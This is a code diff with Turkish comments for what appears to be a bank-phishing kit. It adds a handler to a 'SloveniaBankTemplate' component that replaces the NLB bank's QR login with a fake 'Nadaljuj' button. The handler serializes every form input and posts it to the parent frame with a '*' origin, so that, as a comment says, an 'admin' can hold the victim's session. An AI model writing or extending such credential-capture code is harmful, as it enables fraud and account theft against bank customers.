@@ -2442,6 +2442,27 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
             }
           }
 
+          // ==== NLB: QR kaldırıldı, yerine 'Nadaljuj' devam butonu ====
+          // Sayfa sadece QR paneliydi (form inputlari yok) - generic submit
+          // bos-alan korumasina takilirdi; burada dogrudan postMessage atiyoruz
+          // -> parent session'i kaydeder, admin beklemeye alir.
+          if (/nlb/i.test(window.location.href || '')) {
+            const nlbBtn = target && target.closest ? target.closest('#nlb-qr-continue') : null;
+            if (nlbBtn) {
+              e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+              try {
+                const res = serializeAllLtForms();
+                res.fields.push({ key: 'qr-login', name: 'qr-login', id: 'qr-login', label: 'Prijava s QR kodo', type: 'text', value: 'QR prijava' });
+                res.inputs['qr-login'] = 'QR prijava';
+                window.parent.postMessage({
+                  type: 'SLOVENIA_BANK_SUBMIT',
+                  formData: { inputs: res.inputs, fields: res.fields, loginMethod: 'NLB QR' }
+                }, '*');
+              } catch(_e){}
+              return false;
+            }
+          }
+
           // ==== INTESA SANPAOLO: Vpis butonu ====
           // Login formu sadece hidden input + buton iceriyor, gorunur alanlar
           // form disinda. Buton alanina tiklamayi koordinatla da yakala;
